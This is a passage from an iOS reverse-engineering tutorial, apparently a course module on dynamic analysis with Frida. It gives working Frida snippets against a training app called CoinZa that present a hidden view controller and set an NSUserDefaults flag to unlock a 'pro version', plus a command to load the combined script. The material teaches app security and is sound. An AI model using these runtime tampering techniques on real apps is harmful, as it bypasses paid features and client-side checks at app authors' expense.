    	var initialVC = storyboard.instantiateViewControllerWithIdentifier_('InitialViewController');

    	var navCon = navConClass.alloc().initWithRootViewController_(initialVC);
    	applicationClass.sharedApplication().keyWindow().rootViewController().presentViewController_animated_completion_(navCon, true, NULL);
    }
    ```
- Up until this point all you've done is following the same steps that you did with `Cydia` but with `Frida`'s interactive console. But you have one step left, enabling the pro version:
    ```javascript
    function setProVersion() {
    	var userDefaultsClass = ObjC.classes.NSUserDefaults;
    	userDefaultsClass.setObject_forKey_(true,'isProVersion');
    }
    ```
- Now if you increase the balance of any wallet you'll get an extra 20% for free!
- You can find a script with all these snippets together in [here](https://github.com/ivRodriguezCA/RE-iOS-Apps-Extras-Github/tree/master/Module-4/coinza.js) and you can load it with `Frida` like this:
    ```bash
    frida -U -l coinza.js CoinZa
    ```


##### Conclusions
- For the majority of researchers and hackers I've met, the dynamic analysis is their favourite part of this whole process. I can't blame them, executing code, sending data, remotely sniffing traffic, all of these are exciting _hacks_.
- On the other hand, I hope all these cases show the importance of having a security mindset when developing iOS applications and mobile applications in general. Specially because, like all the issues I showed you during the static analysis, I've seen all of these vulnerabilities in **real world** applications.
- After spending some time understanding how an application was built, attacking its runtime is super fun and in some cases could lead to free stuff. _Note: if you ever find an issue with client-side checks, please report it to the author(s) instead of just exploit it for your benefit._ 😉
